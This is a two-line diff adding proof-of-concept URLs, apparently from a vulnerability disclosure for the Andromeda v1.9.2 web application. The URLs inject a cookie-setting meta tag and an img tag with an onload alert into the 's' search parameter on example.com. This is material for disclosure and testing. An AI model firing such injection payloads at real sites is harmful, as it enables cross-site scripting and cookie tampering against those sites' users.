@@ -1,0 +1,2 @@
+http://www.example.com/Andromeda.v1.9.2-/index.php?q=s&amp;sm=fo&amp;s=&lt;meta+http-equiv=&#039;Set-cookie&#039;+content=&#039;cookiename=cookievalue&#039;&gt;
+http://www.example.com/Andromeda.v1.9.2-/index.php?q=s&amp;sm=fo&amp;s=&lt;img+src=http://www.example.com/1.JPG+onload=alert(00213771818860)&gt;
